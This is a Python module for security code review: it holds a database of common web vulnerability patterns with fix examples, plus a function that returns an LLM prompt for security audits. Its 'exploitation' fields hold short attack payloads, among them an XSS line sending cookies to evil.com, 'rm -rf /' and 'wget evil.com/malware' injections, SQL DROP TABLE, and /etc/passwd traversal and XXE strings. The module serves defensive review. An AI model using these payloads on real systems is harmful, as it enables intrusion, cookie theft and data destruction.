"""
Comprehensive vulnerability detection database for security-focused code review.
This module provides detailed vulnerability patterns, exploitation scenarios, and fix guidance.
"""

from typing import Dict, List
from dataclasses import dataclass


@dataclass
class VulnerabilityPattern:
    """Defines a security vulnerability pattern with detection and fix guidance."""
    cwe_id: str
    name: str
    severity: str
    description: str
    exploitation: str
    impact: List[str]
    detection_patterns: List[str]
    languages: List[str]
    fix_examples: Dict[str, str]


# OWASP Top 10 2021 and Critical CVE Patterns
VULNERABILITY_DATABASE = {
    "SQL_INJECTION": VulnerabilityPattern(
        cwe_id="CWE-89",
        name="SQL Injection",
        severity="critical",
        description="Unsanitized user input in SQL queries allows arbitrary SQL execution",
        exploitation="Attacker injects SQL: ' OR '1'='1'-- or '; DROP TABLE users--",
        impact=["Complete database access", "Data exfiltration", "Data modification/deletion", "Authentication bypass"],
        detection_patterns=[
            "string concatenation in SQL queries",
            "f-strings or format() with user input in SQL",
            "execute() with concatenated strings",
            "raw SQL with user variables",
        ],
        languages=["python", "javascript", "java", "php", "ruby", "go"],
        fix_examples={
            "python": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
            "javascript": "db.query('SELECT * FROM users WHERE id = ?', [userId])",
            "java": "PreparedStatement stmt = conn.prepareStatement('SELECT * FROM users WHERE id = ?'); stmt.setInt(1, userId);",
        }
    ),

    "XSS": VulnerabilityPattern(
        cwe_id="CWE-79",
        name="Cross-Site Scripting (XSS)",
        severity="critical",
        description="Unescaped user input rendered in HTML allows JavaScript injection",
        exploitation="Attacker injects: <script>fetch('evil.com?cookie='+document.cookie)</script>",
        impact=["Session hijacking", "Credential theft", "Malware distribution", "Defacement"],
        detection_patterns=[
            "innerHTML with user input",
            "dangerouslySetInnerHTML in React",
            "unescaped template variables",
            "eval() with user data",
            "document.write() with user input",
        ],
        languages=["javascript", "typescript", "python", "java", "php", "ruby"],
        fix_examples={
            "javascript": "element.textContent = userInput; // or use DOMPurify.sanitize()",
            "react": "Use {userInput} instead of dangerouslySetInnerHTML",
            "python": "from markupsafe import escape; return escape(user_input)",
        }
    ),

    "COMMAND_INJECTION": VulnerabilityPattern(
        cwe_id="CWE-78",
        name="Command Injection",
        severity="critical",
        description="Unsanitized user input in system commands allows arbitrary command execution",
        exploitation="Attacker injects: file.txt; rm -rf / or file.txt && wget evil.com/malware",
        impact=["Remote code execution", "Complete system compromise", "Data theft", "Malware installation"],
        detection_patterns=[
            "os.system() with user input",
            "subprocess.call() with shell=True",
            "exec() or eval() with user data",
            "Runtime.exec() in Java",
            "child_process.exec() in Node.js",
        ],
        languages=["python", "javascript", "java", "php", "ruby", "go"],
        fix_examples={
            "python": "subprocess.run(['ls', user_file], shell=False, check=True)",
            "javascript": "childProcess.execFile('ls', [userFile], callback)",
            "java": "ProcessBuilder pb = new ProcessBuilder('ls', userFile); pb.start();",
        }
    ),

    "PATH_TRAVERSAL": VulnerabilityPattern(
        cwe_id="CWE-22",
        name="Path Traversal",
        severity="critical",
        description="Unvalidated file paths allow access to arbitrary files",
        exploitation="Attacker uses: ../../etc/passwd or ..\\..\\windows\\system32\\config\\sam",
        impact=["Unauthorized file access", "Configuration file disclosure", "Source code theft", "Credential exposure"],
        detection_patterns=[
            "open() with user input",
            "File() with unchecked paths",
            "readFile() with user paths",
            "path.join() without validation",
            "missing path normalization",
        ],
        languages=["python", "javascript", "java", "php", "ruby", "go"],
        fix_examples={
            "python": "from pathlib import Path; safe_path = Path('/safe/dir').resolve() / Path(user_file).name",
            "javascript": "const path = require('path'); const safe = path.join(baseDir, path.basename(userFile));",
            "java": "Path safe = Paths.get('/safe/dir').resolve().resolve(userFile).normalize();",
        }
    ),

    "INSECURE_DESERIALIZATION": VulnerabilityPattern(
        cwe_id="CWE-502",
        name="Insecure Deserialization",
        severity="critical",
        description="Deserializing untrusted data allows arbitrary code execution",
        exploitation="Attacker sends crafted serialized payload to execute malicious code",
        impact=["Remote code execution", "Authentication bypass", "DoS attacks", "Object injection"],
        detection_patterns=[
            "pickle.loads() with untrusted data",
            "yaml.load() without SafeLoader",
            "JSON.parse() with prototype pollution",
            "ObjectInputStream in Java",
            "unserialize() in PHP",
        ],
        languages=["python", "javascript", "java", "php", "ruby"],
        fix_examples={
            "python": "import json; data = json.loads(untrusted)  # Use JSON instead of pickle",
            "javascript": "JSON.parse(untrusted)  # Validate and use allowlist",
            "java": "Use JSON (Jackson/Gson) instead of native serialization",
        }
    ),

    "WEAK_CRYPTO": VulnerabilityPattern(
        cwe_id="CWE-327",
        name="Weak Cryptography",
        severity="high",
        description="Use of weak or broken cryptographic algorithms",
        exploitation="Attacker cracks MD5/SHA1 hashes or breaks weak encryption",
        impact=["Credential compromise", "Data decryption", "Signature forgery", "Session hijacking"],
        detection_patterns=[
            "MD5 or SHA1 for passwords",
            "DES or 3DES encryption",
            "ECB mode encryption",
            "hardcoded cryptographic keys",
            "insufficient key length (<2048 RSA)",
        ],
        languages=["python", "javascript", "java", "php", "ruby", "go", "c++"],
        fix_examples={
            "python": "from argon2 import PasswordHasher; ph = PasswordHasher(); hash = ph.hash(password)",
            "javascript": "const bcrypt = require('bcrypt'); const hash = await bcrypt.hash(password, 12);",
            "java": "Use Argon2, bcrypt, or PBKDF2 with min 100,000 iterations",
        }
    ),

    "HARDCODED_SECRETS": VulnerabilityPattern(
        cwe_id="CWE-798",
        name="Hardcoded Credentials",
        severity="critical",
        description="API keys, passwords, or secrets in source code",
        exploitation="Attacker finds credentials in repository and gains unauthorized access",
        impact=["Complete system access", "Data breaches", "Financial loss", "Reputation damage"],
        detection_patterns=[
            "password = 'literal'",
            "api_key = 'hardcoded'",
            "AWS_ACCESS_KEY in code",
            "private keys in files",
            "connection strings with credentials",
        ],
        languages=["python", "javascript", "java", "php", "ruby", "go", "c++"],
        fix_examples={
            "python": "import os; api_key = os.environ['API_KEY']",
            "javascript": "const apiKey = process.env.API_KEY",
            "java": "String apiKey = System.getenv('API_KEY')",
        }
    ),

    "AUTHENTICATION_BYPASS": VulnerabilityPattern(
        cwe_id="CWE-287",
        name="Authentication Bypass",
        severity="critical",
        description="Weak or missing authentication checks",
        exploitation="Attacker bypasses login or accesses admin functions without authentication",
        impact=["Unauthorized access", "Privilege escalation", "Data manipulation", "System takeover"],
        detection_patterns=[
            "missing authentication decorators",
            "commented out auth checks",
            "client-side only validation",
            "weak session management",
            "missing CSRF protection",
        ],
        languages=["python", "javascript", "java", "php", "ruby"],
        fix_examples={
            "python": "@login_required\n@role_required('admin')\ndef admin_function():",
            "javascript": "if (!req.session.user || !req.session.user.isAdmin) { return res.status(403).json({error: 'Forbidden'}); }",
        }
    ),

    "SSRF": VulnerabilityPattern(
        cwe_id="CWE-918",
        name="Server-Side Request Forgery (SSRF)",
        severity="high",
        description="Server makes requests to attacker-controlled URLs",
        exploitation="Attacker accesses internal services: http://169.254.169.254/metadata",
        impact=["Internal network access", "Cloud metadata theft", "Port scanning", "Service enumeration"],
        detection_patterns=[
            "requests.get(user_url)",
            "fetch(userSuppliedUrl)",
            "URL loading without allowlist",
            "webhook URLs without validation",
        ],
        languages=["python", "javascript", "java", "php", "ruby", "go"],
        fix_examples={
            "python": "from urllib.parse import urlparse\nif urlparse(url).hostname not in ALLOWED_HOSTS: raise ValueError()",
            "javascript": "const allowlist = ['trusted.com']; if (!allowlist.includes(new URL(url).hostname)) throw new Error();",
        }
    ),

    "RACE_CONDITION": VulnerabilityPattern(
        cwe_id="CWE-362",
        name="Race Condition / TOCTOU",
        severity="high",
        description="Time-of-check to time-of-use vulnerabilities",
        exploitation="Attacker exploits timing window between check and use",
        impact=["Privilege escalation", "Resource exhaustion", "Data corruption", "Security bypass"],
        detection_patterns=[
            "check then use pattern",
            "file existence check before access",
            "balance check before withdrawal",
            "missing atomic operations",
            "concurrent access without locks",
        ],
        languages=["python", "javascript", "java", "c++", "go"],
        fix_examples={
            "python": "with file_lock:\n    if check_and_use():",
            "java": "synchronized(this) { if (balance >= amount) balance -= amount; }",
        }
    ),

    "XXE": VulnerabilityPattern(
        cwe_id="CWE-611",
        name="XML External Entity (XXE)",
        severity="high",
        description="XML parser processes external entities allowing file disclosure",
        exploitation="Attacker injects: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
        impact=["File disclosure", "SSRF", "DoS attacks", "RCE in some cases"],
        detection_patterns=[
            "XML parsing without disabling external entities",
            "lxml.etree.parse() without secure defaults",
            "DocumentBuilder in Java without security",
        ],
        languages=["python", "java", "c++", "php"],
        fix_examples={
            "python": "from defusedxml import ElementTree; tree = ElementTree.parse(xml_file)",
            "java": "factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true);",
        }
    ),

    "LDAP_INJECTION": VulnerabilityPattern(
        cwe_id="CWE-90",
        name="LDAP Injection",
        severity="high",
        description="Unescaped input in LDAP queries allows filter manipulation",
        exploitation="Attacker injects: *)(uid=*))(|(uid=* to bypass authentication",
        impact=["Authentication bypass", "Information disclosure", "Privilege escalation"],
        detection_patterns=[
            "LDAP query with string concatenation",
            "unescaped user input in filters",
        ],
        languages=["python", "java", "php", "c++"],
        fix_examples={
            "python": "from ldap3 import escape_filter_chars; safe = escape_filter_chars(user_input)",
            "java": "Use parameterized LDAP queries or escape special characters",
        }
    ),

    "OPEN_REDIRECT": VulnerabilityPattern(
        cwe_id="CWE-601",
        name="Open Redirect",
        severity="medium",
        description="Unvalidated redirect URLs enable phishing attacks",
        exploitation="Attacker crafts: /redirect?url=http://evil.com/fake-login",
        impact=["Phishing attacks", "OAuth token theft", "XSS in some cases"],
        detection_patterns=[
            "redirect(user_url)",
            "location.href = user_input",
            "header('Location: ' . user_url)",
        ],
        languages=["python", "javascript", "java", "php", "ruby"],
        fix_examples={
            "python": "from urllib.parse import urlparse\nif urlparse(url).netloc in ALLOWED_DOMAINS: redirect(url)",
            "javascript": "if (url.startsWith('/')) window.location.href = url",
        }
    ),

    "CSRF": VulnerabilityPattern(
        cwe_id="CWE-352",
        name="Cross-Site Request Forgery (CSRF)",
        severity="high",
        description="Missing CSRF protection on state-changing operations",
        exploitation="Attacker tricks user into submitting malicious form or request",
        impact=["Unauthorized actions", "Data modification", "Account takeover", "Financial fraud"],
        detection_patterns=[
            "POST/PUT/DELETE without CSRF token",
            "missing SameSite cookie attribute",
            "state change on GET request",
        ],
        languages=["python", "javascript", "java", "php", "ruby"],
        fix_examples={
            "python": "@csrf_protect\ndef update_profile(request):",
            "javascript": "Set SameSite=Strict on session cookies + verify CSRF token",
        }
    ),

    "INSECURE_RANDOM": VulnerabilityPattern(
        cwe_id="CWE-338",
        name="Insecure Randomness",
        severity="high",
        description="Predictable random values for security-critical operations",
        exploitation="Attacker predicts session tokens or CSRF tokens",
        impact=["Session hijacking", "Token prediction", "Cryptographic weakness"],
        detection_patterns=[
            "random.random() for tokens",
            "Math.random() for security",
            "time-based seeds",
        ],
        languages=["python", "javascript", "java", "c++"],
        fix_examples={
            "python": "import secrets; token = secrets.token_urlsafe(32)",
            "javascript": "const crypto = require('crypto'); const token = crypto.randomBytes(32).toString('hex');",
        }
    ),
}


def get_security_prompt_context() -> str:
    """Generate comprehensive security review context for LLM prompts."""

    context = """
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
CRITICAL SECURITY VULNERABILITY DETECTION PROTOCOL
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

You are a EXPERT SECURITY RESEARCHER conducting a CRITICAL SECURITY AUDIT.
Your PRIMARY MISSION is to identify vulnerabilities that could lead to:
  - Data breaches
  - Remote code execution
  - Authentication bypasses
  - Unauthorized access
  - Financial/reputational damage

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
PRIORITY 1: CRITICAL VULNERABILITIES (MUST DETECT)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. INJECTION FLAWS (CWE-89, CWE-78, CWE-79)
   âœ“ SQL Injection: String concatenation in queries
   âœ“ Command Injection: User input in system commands
   âœ“ XSS: Unescaped HTML output
   âœ“ LDAP Injection: Unescaped LDAP filters
   âœ“ XML Injection (XXE): External entity processing

2. AUTHENTICATION & ACCESS CONTROL (CWE-287, CWE-863)
   âœ“ Missing authentication checks
   âœ“ Hardcoded credentials (API keys, passwords)
   âœ“ Weak session management
   âœ“ Privilege escalation paths
   âœ“ CSRF missing on state changes

3. CRYPTOGRAPHIC FAILURES (CWE-327, CWE-798)
   âœ“ MD5/SHA1 for passwords
   âœ“ Weak encryption (DES, ECB mode)
   âœ“ Hardcoded keys/secrets
   âœ“ Insecure random (Math.random() for tokens)
   âœ“ Missing certificate validation

4. CODE EXECUTION RISKS (CWE-502, CWE-94)
   âœ“ Insecure deserialization (pickle, yaml.load)
   âœ“ eval()/exec() with user input
   âœ“ Template injection
   âœ“ Arbitrary file upload

5. PATH & FILE VULNERABILITIES (CWE-22, CWE-434)
   âœ“ Path traversal (../ attacks)
   âœ“ Unrestricted file upload
   âœ“ Unsafe file operations
   âœ“ Directory listing enabled

6. SERVER-SIDE REQUEST FORGERY (CWE-918)
   âœ“ Unvalidated URL fetching
   âœ“ Webhook without allowlist
   âœ“ Internal service access

7. RACE CONDITIONS (CWE-362)
   âœ“ TOCTOU vulnerabilities
   âœ“ Missing locks on shared resources
   âœ“ Non-atomic operations

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
DETECTION METHODOLOGY
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

For EACH code block, systematically check:

1. INPUT VALIDATION
   â†’ Is user input sanitized before use?
   â†’ Are there allowlists for expected values?
   â†’ Is input length/format validated?

2. OUTPUT ENCODING
   â†’ Is output escaped for context (HTML, SQL, shell)?
   â†’ Are templates auto-escaping?
   â†’ Is JSON encoding used correctly?

3. AUTHENTICATION & AUTHORIZATION
   â†’ Are endpoints protected?
   â†’ Is role-based access enforced?
   â†’ Are session tokens cryptographically secure?

4. CRYPTOGRAPHY
   â†’ Are modern algorithms used (Argon2, AES-256-GCM)?
   â†’ Are keys/secrets from environment variables?
   â†’ Is TLS/HTTPS enforced?

5. ERROR HANDLING
   â†’ Are sensitive errors caught?
   â†’ Is stack trace hidden from users?
   â†’ Are errors logged securely?

6. DEPENDENCIES & CONFIGURATION
   â†’ Are dependencies up-to-date?
   â†’ Are security headers set?
   â†’ Is debug mode disabled in production?

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
REPORTING REQUIREMENTS
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

For EVERY critical/high severity vulnerability found:

1. VULNERABILITY IDENTIFICATION
   - CWE ID and name
   - Exact line numbers
   - Affected code snippet
   - Severity justification

2. EXPLOITATION PROOF-OF-CONCEPT
   - How would an attacker exploit this?
   - What payload would they use?
   - What is the attack complexity (low/medium/high)?

3. REAL-WORLD IMPACT
   - What data could be compromised?
   - What systems could be affected?
   - What is the business impact?

4. MULTIPLE FIX OPTIONS (2-3 minimum)
   Each fix must include:

   OPTION 1 - Quick Fix (immediate mitigation):
   ```language
   [exact code snippet]
   ```
   âœ… PROS: [specific benefits]
   âŒ CONS: [specific limitations]
   â±ï¸  Time to implement: [estimate]
   ğŸ›¡ï¸  Risk reduction: [percentage]

   OPTION 2 - Secure Fix (comprehensive):
   ```language
   [exact code snippet]
   ```
   âœ… PROS: [specific benefits]
   âŒ CONS: [specific limitations]
   â±ï¸  Time to implement: [estimate]
   ğŸ›¡ï¸  Risk reduction: [percentage]

   OPTION 3 - Best Practice (industry standard):
   ```language
   [exact code snippet]
   ```
   âœ… PROS: [specific benefits]
   âŒ CONS: [specific limitations]
   â±ï¸  Time to implement: [estimate]
   ğŸ›¡ï¸  Risk reduction: [percentage]

5. RECOMMENDATION
   - Which option should be used and why?
   - Any additional security measures needed?
   - References to security standards (OWASP, NIST, etc.)

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
CONFIDENCE SCORING GUIDELINES
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

0.95-1.00: DEFINITE vulnerability (obvious exploit path)
0.85-0.94: HIGH confidence (clear security issue)
0.70-0.84: MEDIUM confidence (likely issue, needs verification)
0.50-0.69: LOW confidence (potential issue, context dependent)
<0.50: Do NOT report (insufficient evidence)

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
CRITICAL RULES
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

âœ“ ONLY report CRITICAL and HIGH severity issues
âœ“ IGNORE style, formatting, minor improvements
âœ“ Provide CONCRETE code examples for ALL fixes
âœ“ Include SPECIFIC exploitation scenarios
âœ“ Use CWE references for all vulnerabilities
âœ“ Rate confidence honestly (0.9+ for critical issues)
âœ“ Focus on exploitable vulnerabilities, not theoretical risks

âœ— DO NOT report low-severity issues
âœ— DO NOT suggest subjective improvements
âœ— DO NOT provide vague fixes
âœ— DO NOT skip exploitation details

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""
    return context
